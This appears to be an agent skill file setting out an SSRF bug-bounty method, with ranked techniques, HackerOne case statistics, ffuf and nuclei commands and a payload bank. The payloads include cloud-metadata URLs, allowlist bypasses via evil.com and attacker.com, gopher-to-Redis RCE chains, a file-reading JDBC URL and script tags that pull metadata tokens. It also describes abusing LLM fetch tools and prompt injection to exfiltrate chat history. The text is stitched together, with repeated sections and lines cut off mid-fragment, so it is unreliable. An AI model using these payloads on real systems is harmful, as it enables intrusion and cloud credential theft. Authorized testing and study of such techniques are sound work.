---
name: bbhunt-ssrf
description: "Use for any server-side URL fetch: webhooks, avatar/image import, link preview, PDF/render, RSS, OAuth metadata, import-from-URL, and URL parameters. Unified from 4 upstream skills (cbh, h1skills, hunting, research). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# Server-Side Request Forgery — unified methodology

> **Unified skill.** Built from 4 upstream skills across cbh, h1skills, hunting, research and the local HackerOne corpus. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Corpus evidence (337 valid reports, 105 paid / 31%)

Payment is not validity — zero-bounty disclosures are mined as evidence too.

### Techniques ranked across ALL valid writeups

| Technique | Reports |
|---|---:|
| internal service / port / container | 131 |
| public source-code / repo review | 66 |
| header injection (Host / X-Forwarded / etc.) | 60 |
| encoding / double-encode / null byte | 60 |
| Content-Type / body-format switch | 48 |
| subdomain / DNS / cert-transparency recon | 45 |
| cloud metadata / IAM abuse | 42 |
| second-order / stored / blind delivery | 40 |
| admin / privileged-role context | 39 |
| WAF / sanitizer / filter bypass | 39 |

### Parameters observed

`url`, `src`, `charset`, `max-age`, `a-4829527691`, `command`, `user_id`, `onerror`, `width`, `height`, `http_only`, `type`, `edit_service`, `text`, `token`

### Case studies (real reports, paid and unpaid)

- [826361](https://hackerone.com/reports/826361) GitLab — SSRF on project import via the remote_attachment_url on a Note ($10000, high)
- [1960765](https://hackerone.com/reports/1960765) Reddit — Blind SSRF to internal services in matrix preview_link API ($6000, high)
- [776017](https://hackerone.com/reports/776017) Kubernetes — Half-Blind SSRF found in kube/cloud-controller-manager can be upgraded to complete SSRF (fully crafted HTTP requests) in vendor managed k8s service. ($5000, high)

Full payload bank, bypass frequencies, approach patterns and case-study excerpts: `references/evidence.md`.

## Corpus-backed method (this class)

1. Inventory every server-side fetcher before probing: create, update, preview, test, import, render, and async job endpoints all count.
2. Set up a unique OAST/DNS/HTTP callback first. Confirm outbound traffic from the server before spending time on internal targets.
3. Classify the oracle: response body reflected, status code difference, error text, or timing only. Blind SSRF needs a second signal before it is reportable.
4. Test redirect following — a trusted-domain open redirect often bypasses a host allowlist without touching the parser.
5. Probe parser confusion: userinfo (@), fragments, backslashes, tabs/CRLF, decimal/octal/hex IPs, IPv6-mapped addresses, and DNS names resolving to loopback.
6. Only after reachability is proved, target link-local metadata and internal services appropriate to scope; test non-HTTP schemes only when the backend stack plausibly supports them.
7. Prove data access (metadata body, internal response, protocol banner) rather than stopping at a callback. Minimize and document controls that blocked you.

### Signals

- A parameter whose value becomes a URL the server later requests
- A webhook or integration test button that reports delivery status
- Internal hostnames or cloud metadata mentioned in docs or stack traces
- An allowlist that checks a string but never resolves DNS

### Kill criteria

- DNS/HTTP callback only, with no internal reachability or data — blind SSRF alone is often weak.
- The 'internal' URL was fetched by your own browser, not by the server.
- Out of scope: internal services or cloud metadata not covered by the program brief.

### Escalation chains

- Metadata credentials -> cloud account access -> storage or infrastructure compromise.
- Internal admin panel reachable -> unauthenticated function -> RCE or data.
- Open redirect on an allowed host -> allowlist bypass -> metadata read.

### Veteran tip

The operator's webhook case is the textbook pattern: IP literals blocked, DNS names never resolved. Validation that never performs DNS resolution is bypassable by design.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Find server-side URL fetchers: webhooks, avatar/image import, link preview, PDF/render, RSS, OAuth metadata, import-from-URL.
- Confirm outbound traffic with a unique DNS/HTTP callback before trying internal targets.
- Test the response body, status code, timing, and error text for internal reachability.
- Check redirect-following: a trusted-domain open redirect can bypass host allowlists.
- Try non-HTTP schemes and protocols used by the backend (gopher, file, dict, ftp).

### Deeper checklist

- Find URL inputs: webhooks, avatars, imports, previews, PDF/render, RSS, OAuth metadata.
- Use a callback domain first to confirm outbound requests (DNS + HTTP).
- Test internal targets: 127.0.0.1, localhost, [::1], 169.254.169.254, RFC1918, internal hostnames.
- Bypass filters with decimal/octal/hex IPs, DNS rebinding, redirects, userinfo, and URL parsing quirks.
- Try non-HTTP schemes: gopher, file, dict, ftp, and cloud metadata endpoints.
- Check redirect-following and allowlist bypass via open redirects on trusted domains.
- Escalate to credential theft, internal API access, or port scanning with evidence.

### Step-by-Step Hunting Methodology

1. **Map all URL-input parameters** across the target: spider JS files for fetch calls, check all API docs, look for file-import, link-preview, webhook, image-proxy, and redirect features.

2. **Set up an out-of-band detection server** using Burp Collaborator, interactsh, or `https://canarytokens.org` — you need a unique per-test DNS/HTTP callback domain.

3. **Send your callback URL as the parameter value first** (blind SSRF check before anything else):
   ```
   url=https://YOUR.interactsh.com/test
   ```
   Confirm the server makes an outbound connection. This proves execution before attempting internal targets.

4. **Test internal cloud metadata endpoints**:
   - GCP: `http://metadata.google.internal/computeMetadata/v1/`
   - AWS: `http://169.254.169.254/latest/meta-data/`
   - Azure: `http://169.254.169.254/metadata/instance`

5. **Test localhost and common internal ports**:
   ```
   http://localhost/
   http://127.0.0.1:8080/
   http://127.0.0.1:6443/  (Kubernetes API)
   http://127.0.0.1:2379/  (etcd)
   http://127.0.0.1:9090/  (Prometheus)
   http://127.0.0.1:9200/  (Elasticsearch)
   ```

6. **Check for redirect-based SSRF** — if the endpoint validates the initial URL but follows 30x redirects, host a redirect server pointing to internal addresses. Kubernetes report (Report 3) was specifically triggered by hijacked API servers returning 30x responses.

7. **Test JavaScript-execution contexts** (headless browsers, PDF renderers):
   - Inject `<script>` tags that make `XMLHttpRequest` or `fetch()` calls to internal services
   -

### Web-Research Methodology Additions (2026)

Sourced from current PortSwigger Web Security Academy / Research, HackTricks, and a 2026 GitHub Security Advisory (see D). These extend — not replace — the OOB gate above: every blind claim still needs a Collaborator/interactsh hit.

### A. Discovery checklist — concrete places, parameters, headers, file types, and workflows to look for this bug class

- **Full-URL parameters (obvious sinks):** `url`, `uri`, `link`, `src`, `source`, `dest`, `target`, `endpoint`, `fetch`, `load`, `image`, `avatar`, `webhook`, `callback`, `feed`, `proxy`, `next`, `redirect`, `return`, `rurl`.
- **Partial-URL / hostname-only inputs** (PortSwigger "hidden attack surface"): params carrying only a host or path that are concatenated into a full URL server-side — `host=`, `domain=`, `path=`, `file=`. They are easy to miss because the value does not look like a URL.
- **URLs inside data formats:** XML/XXE external entities, DSPL/CSV remote schemas, SVG `<image xlink:href>`, JSON bodies with `url` / `@id` / `contentUrl`, feed (RSS/Atom) parsers, webhook registration, OAuth/SSO metadata-URL fields.
- **Non-obvious header surface:** the `Referer` header is a documented blind-SSRF sink (server-side analytics visitors fetch third-party URLs seen in Referer). Also test `X-Forwarded-Host`, `X-Original-URL`, `Host`, `Origin` when reflected into fetches.
- **File types that render server-side:** PDF generators (wkhtmltopdf, WeasyPrint, PDFBox, pd4ml), screenshotters (Puppeteer/Playwright/PhantomJS), image processors, document converters.
- **JS bundle grep:** `grep -Eo "fetch\(|axios\.[a-z]+\(|XMLHttpRequest|URL\(" bundle.js` then verify a user variable actually reaches the URL argument.

Server-side-rendering injection shapes (HackTricks / YesWeHack):
```
<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
<img src="http://

### Part 6 — Step-by-step hunting methodology

1. **Map all URL-input parameters** across the target: spider JS files for fetch calls, check API docs, look for file-import, link-preview, webhook, image-proxy, and redirect features.
2. **Set up an OOB detector** — Burp Collaborator, interactsh, or canarytokens — with a unique per-test callback domain.
3. **Send your callback URL as the parameter value first** (blind check before anything else): `url=https://YOUR.interactsh.com/test`. Confirm the server makes an outbound connection. This proves execution before attempting internal targets.
4. **Test internal cloud metadata endpoints** (see §2.2).
5. **Test localhost and common internal ports** (see §2.1).
6. **Test redirect-based bypasses early** — if the app validates the initial URL but follows 30x redirects, host a redirect server pointing to internal addresses.
7. **Test JavaScript-execution contexts** (headless browsers, PDF renderers): inject `<script>` tags that make XMLHttpRequest/fetch calls to internal services; exfil via DNS by encoding response data in subdomains.
8. **Enumerate the internal network** using timing differences and error message variation — port scan via response time (connection refused vs timeout), check error text for hostname/IP leakage.
9. **Chain findings** — if you have SSRF to internal services, look for unauthenticated admin endpoints, Redis/memcached (protocol smuggling), internal OAuth token endpoints, SSRF → CSRF → RCE (GitHub Enterprise pattern).
10. **Document the full chain** with screenshots of each hop before reporting.

Then apply 

### Signals and surfaces

### Signal

- Reports: **337** · paid: **105**
- Median bounty **$700** · p90 **$4,263** · max **$25,000** · total **$178,859**
- Median upvotes **22**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| HackerOne | 7 | $31,500 | 931 |
| Dropbox | 2 | $22,489 | 662 |
| GitLab | 18 | $19,750 | 1582 |
| Internet Bug Bounty | 7 | $16,043 | 217 |
| Mail.ru | 36 | $15,150 | 1549 |
| Open-Xchange | 15 | $10,250 | 396 |
| Lark Technologies | 5 | $8,000 | 539 |
| LY Corporation | 5 | $6,050 | 250 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`url` `uri` `link` `image` `avatar` `webhook` `callback` `feed` `proxy` `next` `dest` `host` `domain` `site` `fetch` `load`

### Crown Jewel Targets

SSRF is highest-value when the target runs on cloud infrastructure (AWS, GCP, Azure) where metadata services expose credentials, or when the server sits inside a complex internal network (Kubernetes clusters, microservice meshes, internal APIs). Priority targets:

- **Cloud-hosted SaaS products** (GCP metadata at `169.254.169.254` or `metadata.google.internal`, AWS IMDSv1)
- **Kubernetes/orchestration platforms** — aggregated API servers, metrics-server, kubelet endpoints expose privileged cluster operations
- **Internal developer tooling** — CI/CD, workflow orchestration (Flyte, Argo), admin panels not exposed externally
- **Link preview / URL fetching features** — Reddit-style preview APIs, Slack-style unfurling, media processors
- **Dataset/file import pipelines** — anything that fetches remote URLs on behalf of a user
- **Enterprise self-hosted software** (GitHub Enterprise, GitLab) — SSRF frequently chains to RCE via internal services

Payouts are highest when SSRF reaches: cloud credentials → account takeover, internal admin APIs → data exfil, or chains to RCE.

---

### Response Header Signals

```
X-Forwarded-For headers echoed back
Server: internal-service
Via: 1.1 internal-proxy
X-Cache headers revealing internal hostnames
```

### Tech Stack Signals

- **Kubernetes** — any public-facing aggregated API, metrics endpoints
- **GCP** — any service fetching URLs that runs on Compute Engine/GKE
- **Node.js/Python** with URL-fetching libraries (`requests`, `node-fetch`, `axios`)
- **Headless browsers** (Puppeteer, PhantomJS) used for screenshots/PDF — extremely high value
- **XML/DSPL/CSV import features** — XXE-style SSRF vector
- **OAuth/webhook registration** endpoints

---

_...and 4 more sections in `references/unified-method.md`._

### Techniques, payloads and bypasses

### Payloads & probes

- Cloud metadata -> `http://169.254.169.254/latest/meta-data/` `http://metadata.google.internal/computeMetadata/v1/`
- Loopback -> `http://127.0.0.1` `http://[::1]` `http://0x7f000001` `http://2130706433`
- Bypass form -> `http://169.254.169.254\@127.0.0.1:8000/` `http://127.1` `http://0177.0.0.1`
- Scheme abuse -> `file:///etc/passwd` `gopher://127.0.0.1:6379/_INFO` `dict://127.0.0.1:11211/stat`
- Redirect -> `https://trusted.com/redirect?url=http://169.254.169.254/`

### Payload bank

**85 curated payloads** in 6 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.

### Allowlist & parser bypass

```text
http://169.254.169.254\@127.0.0.1:8000/latest/meta-data/
http://127.0.0.1@169.254.169.254/
http://169.254.169.254#@127.0.0.1/
http://169.254.169.254%2f@127.0.0.1/
http://127.0.0.1:80@evil.com/
http://evil.com:80@127.0.0.1/
http://127.0.0.1%00.evil.com/
http://127.0.0.1%20.evil.com/
http://127.0.0.1.attacker.com/
http://attacker.com#@127.0.0.1/
http://attacker.com?@127.0.0.1/
http://127.0.0.1./
http://127.0.0.1:80\@evil.com/
//127.0.0.1/
\\127.0.0.1\
http://evil.com\@127.0.0.1/
http://127.0.0.1%09.evil.com/
http://127.0.0.1%0d%0a.evil.com/
```

### Bypass tricks

- Decimal/octal/hex IPs, IPv6-mapped addresses, and DNS names resolving to 127.0.0.1.
- DNS rebinding: resolve a controlled hostname to a public IP, then to 169.254.169.254.
- URL parser confusion with @, #, ?, backslashes, %09/%0d%0a, and userinfo.
- Allowlist suffix tricks: trusted.com.evil.com, evil.com#trusted.com, evil.com?trusted.com.
- Use open redirects on allowlisted hosts to reach internal targets.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **SSRF in Exchange leads to ROOT access in all instances** — `#341876` · Shopify · $0 · ▲587
  > However, I found really easy way to "bypass" it while reading the documentation: the `/v1beta1` endpoint is still available, does not require the `Metadata-Flavor: Google` header and still returns the same token.
- **Server-Side Request Forgery using Javascript allows to exfill data from Google Metadata** — `#530974` · Snapchat · $0 · ▲421
  > - Now hit `/api/v1/media/import` on `ads.snapchat.com`, with the URL parameter http://demon.███████/ssrf.html (or wherever you run it)
- **SSRF on project import via the remote_attachment_url on a Note** — `#826361` · GitLab · $10,000 · ▲359
  > A POST request is not possible here, but as `remote attachment request header=` is also available (https://github.com/carrierwaveuploader/carrierwave/blob/v1.3.1/lib/carrierwave/mount.rb L169) and not blacklisted, the payload could be set via a header.
- **Server Side Request Forgery mitigation bypass** — `#632101` · GitLab · $0 · ▲350
  > After the hook has executed, you should see content of `http://169.254.169.254` returned.
- **Blind SSRF to internal services in matrix preview_link API** — `#1960765` · Reddit · $6,000 · ▲344
  > Visit the https://matrix.redditspace.com/ matrix/media/r0/preview url/?url=
- **TURN server allows TCP and UDP proxying to internal network, localhost and meta-data services** — `#333419` · Slack · $3,500 · ▲323
  > UDP p

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 4× | `http://[fe80::1%25eth0]/` |
| 4× | `fe80::1%eth0` |
| 3× | `(scheme, hostname, port)` |
| 2× | `https://<your-attacker-server>/redir.php` |
| 2× | `RealPlayerApi.apply()` |
| 2× | `http://169.254.169.254\@127.0.0.1:8000/latest/meta-data/` |
| 2× | `{readapi.<url_here>}` |
| 2× | `http.<url>.proxy` |
| 2× | `..%2F..%2Fapi/v0/shutdown` |
| 2× | `%2F` |
| 2× | `fe80::1%1` |
| 2× | `%eth0` |
| 2× | `Unknown mime-type: text/html; charset=UTF-8` |
| 2× | `Curl_idn_decode()` |
| 2× | `$('.upgradeToAdmin').click(function () { / let t = $('input[name="username"]').val(); / $.get('/admin/upgrade?username=' + t, function () {` |
| 2× | `POST /hate-mail-generator/new/preview HTTP/1.1 / Host: hackyholidays.h1ctf.com / ...... / preview_markup=Hello,{{name}}&preview_data={"name` |
| 2× | `{{}}` |
| 1× | `<script> / window.location="http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token"; / // iframes d` |
| 1× | `<script> / window.location="http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json"; / </script>` |
| 1× | `curl -X POST "https://www.googleapis.com/compute/v1/projects/███/setCommonInstanceMetadata" -H "Authorization: Bearer ██████████████" -H "Co` |

_...and 21 more sections in `references/unified-method.md`._

### Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

### OOB-Or-It-Didn't-Happen Gate (Read First)

**Claims of blind SSRF require an out-of-band (OOB) confirmation. Always. No exceptions.**

OOB means: a Burp Collaborator domain, an `interactsh-client` listener, a canarytoken, or any DNS+HTTP receiver you control that confirms the server actually made an outbound network connection on your behalf.

### What is NOT confirmation of SSRF

- The server **echoing your URL back in an error message**. Example: `"The Web application at http://evil.example.com/x could not be found"` — this is the server formatting your input into an error string, NOT making an outbound HTTP request. The error came from string formatting, not from network failure.
- The server returning a different status code for an external URL vs `localhost`. Different error responses can come from URL-scheme validators, not from actual fetching.
- A delayed response when the URL is sent. Delay can come from DNS resolution attempts within the parser, not from completed HTTP fetches.

### What IS confirmation of SSRF

- A DNS lookup for your unique Collaborator subdomain appears in the OOB listener.
- An HTTP request to your Collaborator HTTP endpoint with the server's source IP and User-Agent.
- For SSRF in JavaScript-execution contexts (PDF renderers, headless browsers), a fetch from the server to your callback URL.

### Gate 0 Validation

Before writing the report, confirm all three:

1. **What can the attacker DO right now?**
   - Can you retrieve a response proving internal network access? (Show the metadata token, internal API response, or confirmed DNS callback)
   - If blind: can you demonstrate port differentiation or confirmed OOB callback tied to a specific internal address?
   - "The server makes a request" alone is insufficient — show *where* it goes and *what comes back*.

2. **What does the victim LOSE?**
   - Cloud credentials (IAM tokens) → full cloud account compromise?
   - Internal service data (user PII, secrets, API keys)?
   - Ability to pivot to RCE via internal admin service?
   - If the answer is only "the server fetches my URL," severity is low — quantify the actual reachable blast radius.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Is the vulnerable endpoint still live and the parameter still present?
   - Does your callback server show the hit reliably (not intermittently)?
   - Can a second person follow your steps without prior knowledge and get the same result?
   - If reproduction requires specific timing, tokens, or luck — resolve the flakiness before submitting.

---

_...and 4 more sections in `references/unified-method.md`._

### Escalation and related chains

### Escalation chains

- Metadata -> cloud keys -> S3/account takeover.
- Internal admin panel -> RCE.
- Redis/Memcached via gopher -> RCE.

### Related Skills & Chains

- **`cloud-iam-deep`** — SSRF is the canonical entry to cloud metadata service. Chain primitive: SSRF → IMDSv1 token theft → `cloud-iam-deep` privilege escalation reaches `iam:CreateUser` / `sts:AssumeRole` on cross-account roles.
- **`llm-ai`** — LLMs with fetch_url tools become SSRF proxies bypassing network egress controls. Chain primitive: LLM tool-use (fetch_url) + SSRF → attacker URL exfils chat history and IMDS token from the LLM container.
- **`rce`** — Internal Redis/Memcached are unauthenticated by default and reachable via gopher://. Chain primitive: SSRF + Gopher → internal Redis `CONFIG SET dir` + RCE via cron / SSH authorized_keys write.
- **`cloud-misconfig`** — Internal-only buckets/APIs become reachable through SSRF egress. Chain primitive: SSRF + DNS rebinding → SSRF-protected-endpoint bypass → internal /admin or private S3 bucket read.
- **`security-arsenal`** — Load the SSRF IP Bypass Table (11 techniques: decimal IP, IPv6 mapped, octal, suffix dot, DNS rebinding, redirect chain, etc.) before testing filters.
- **`triage-validation`** — Apply the OOB-Or-It-Didn't-Happen gate: every blind SSRF claim requires a Burp Collaborator hit with a unique marker before report submission.

### 4.11 Connection-string SSRF (JDBC / Redis / Mongo / LDAP) with file-read escalation

Any "test connection"/"data source config" feature accepting JDBC/Redis/Mongo/LDAP URLs is a blind-SSRF + potential file-read dual vector. Dinky (≤1.2.5) and SpringBlade's `testConnect`: attacker supplies a MySQL JDBC URL, probes internal hosts/ports via driver error timing (SSRF/port-scan), then sets `allowLoadLocalInfile=true` to abuse `LOAD DATA LOCAL INFILE` and read arbitrary files (configs, private keys) off the app host:

```
jdbc:mysql://internal-host:3306/test?allowLoadLocalInfile=true
```

### 7.1 Escalation chains

- Metadata → cloud keys → S3/account takeover
- Internal admin panel → RCE
- Redis/Memcached via gopher → RCE
- SSRF → CSRF → RCE (GitHub Enterprise pattern)
- Screenshot / PDF renderer → cloud metadata → container root

### Related skills & chains

- **hackerone-open-redirect** (385 reports) — SSRF bypass via trusted-domain open redirects.
- **hackerone-rce** (1,399 reports) — Redis/Memcached via gopher → RCE.
- **hackerone-info-disclosure** (1,827 reports) — internal file/endpoint leakage.
- **cloud-iam-deep** — SSRF → IMDSv1 token theft → privilege escalation to `iam:CreateUser` / `sts:AssumeRole` on cross-account roles.
- **hunt-llm-ai** — LLMs with `fetch_url` tools become SSRF proxies bypassing network egress controls. Chain: LLM tool-use + SSRF → attacker URL exfils chat history and IMDS token from the LLM container.
- **hunt-rce** — Internal Redis/Memcached are unauthenticated by default and reachable via `gopher://`. Chain: SSRF + Gopher → internal Redis `CONFIG SET dir` + RCE via cron / SSH authorized_keys write.
- **hunt-cloud-misconfig** — Internal-only buckets/APIs become reachable through SSRF egress. Chain: SSRF + DNS rebinding → SSRF-protected-endpoint bypass → internal `/admin` or private S3 bucket read.
- **security-arsenal** — Load the SSRF IP Bypass Table (11 techniques: decimal IP, IPv6-mapped, octal, suffix dot, DNS rebinding, redirect chain, etc.) before testing filters.
- **triage-validation** — Apply the OOB-Or-It-Didn't-Happen gate: every blind SSRF claim requires a Collaborator hit with a unique marker before report submission.

### Related Skills & Chains

- **`cloud-iam-deep`** — SSRF is the canonical entry to cloud metadata service. Chain primitive: SSRF → IMDSv1 token theft → `cloud-iam-deep` privilege escalation reaches `iam:CreateUser` / `sts:AssumeRole` on cross-account roles.
- **`hunt-llm-ai`** — LLMs with fetch_url tools become SSRF proxies bypassing network egress controls. Chain primitive: LLM tool-use (fetch_url) + SSRF → attacker URL exfils chat history and IMDS token from the LLM container.
- **`hunt-rce`** — Internal Redis/Memcached are unauthenticated by default and reachable via gopher://. Chain primitive: SSRF + Gopher → internal Redis `CONFIG SET dir` + RCE via cron / SSH authorized_keys write.
- **`hunt-cloud-misconfig`** — Internal-only buckets/APIs become reachable through SSRF egress. Chain primitive: SSRF + DNS rebinding → SSRF-protected-endpoint bypass → internal /admin or private S3 bucket read.
- **`security-arsenal`** — Load the SSRF IP Bypass Table (11 techniques: decimal IP, IPv6 mapped, octal, suffix dot, DNS rebinding, redirect chain, etc.) before testing filters.
- **`triage-validation`** — Apply the OOB-Or-It-Didn't-Happen gate: every blind SSRF claim requires a Burp Collaborator hit with a unique marker before report submission.

### Tools and wordlists

### Tools

`interactsh` · `Burp Collaborator` · `ssrfmap` · `httpx` · `ffuf`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_ssrf.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_ssrf.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/payloads_ssrf.txt` | 85 |
| `~/.local/share/hackerone-reports/wordlists/payloads_ssrf_waf.txt` | 26 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_ssrf.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_ssrf.txt \
     -mr 'canary|error|invalid|not found' -rate 40
ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_ssrf.txt \
     -mr '<hit-marker>' -rate 20
```

### Nuclei

Set up an interactsh/OAST listener first; SSRF templates often only prove outbound traffic.

```sh
nuclei -u https://target -tags ssrf,oast \
       -severity low,medium,high,critical -rl 40 -o nuclei_ssrf.txt
nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/ssrf -dast \
       -rl 40 -o nuclei_ssrf_ssrf.txt
nuclei -u https://target -t ~/nuclei-templates/http/fuzzing/ssrf-via-proxy.yaml \
       -rl 40 -o nuclei_ssrf_ssrf-via-proxy.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### 1.2 Parameter wordlist

When fuzzing for hidden SSRF-prone parameters (Arjun, Burp Intruder, ffuf):

```
url, uri, link, href, src, source, target, dest, destination, redirect,
redirect_uri, return, returnTo, next, continue, callback, callback_url,
webhook, webhook_url, feed, rss, path, file, filename, filepath, folder,
host, hostname, domain, port, ip, address, proxy, fetch, load, import,
api_url, endpoint, service_url, data, reference, document, avatar, image,
image_url, thumbnail, preview, media, download, upload_url, out, to, page
```

Parameters observed in disclosed reports: `url, hash, username, template, password, id, data, payload, alt, format, email, month, year, template[], image, name, target, start, command, user_id`.

### 5.4 Expanded agentic / MCP tool inventory

When the target is agentic, inventory every tool that can cause network access, not just ones literally named `fetch`:

| Tool class | What to check |
|---|---|
| Direct fetch tool | Arbitrary URL/host reaches an HTTP client with no re-validation |
| Browser navigation tool | Main-frame AND subresource policy; screenshot/evaluation permissions separate from navigation |
| Document ingestion / RAG loader | Parser makes hidden secondary requests (remote images, XML includes) while "just" converting a doc |
| Search connector | Is the provider/base URL itself attacker-influenceable? |
| Workflow HTTP node | Stored destination + delayed worker execution — re-validated at run time or only at save time? |
| MCP server discovery/config | Does changing remote server metadata influence later connections? |
| Code-execution tool | Does the sandbox expose sockets/requests/fetch to generated code? |
| LLM media loader | image_url/audio_url/document references fetched by inference infra itself, before the model ever "does" anything |

Distinct trust boundaries worth testing independently: direct prompt vs. indirect instructions buried in a page/file/email/RAG chunk (prompt-injection-driven SSRF); UI validation vs. tool-adapter validation; one tool's output becoming a second tool's URL argument (tool chaining); your account's identity vs. a more privileged agent/service identity performing the actual fetch.

### 5.6 Source-code grep patterns

```bash
# Find URL fetch operations
grep -rE "(fetch|curl|urllib|requests\.get|http\.get|axios\.get)\s*\(" --include="*.py" --include="*.js" --include="*.go"

# Find URL parameters being passed to HTTP clients
grep -rE "(url|uri|endpoint|redirect|src|source)\s*=\s*req\.(query|body|params)" --include="*.js"

# Find redirect following
grep -rE "(follow_redirects|allow_redirects|followRedirects)\s*=\s*[Tt]rue"
```

---

_...and 3 more sections in `references/unified-method.md`._

## Source skills merged into this topic

- `h1skills` — `hackerone-ssrf`
- `hunting` — `ssrf`
- `research` — `hunt-ssrf`
- `cbh` — `hunt-ssrf`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `references/upstream-assets/` — 2 companion files (payload/technique references, scripts, validators and schemas) from the contributing skills
- `references/unified-method.md` — includes 2 merged companion methodology documents
- `references/corpus-wordlists/` — 4 mined paths/params/payload lists from the HackerOne corpus
- `../../upstream/` — complete unmodified archives of all five source repositories
- `references/evidence.md` — corpus technique frequencies, parameters, case studies and payload bank
- `bbhunt-methodology` — orchestrator, state machine and class router
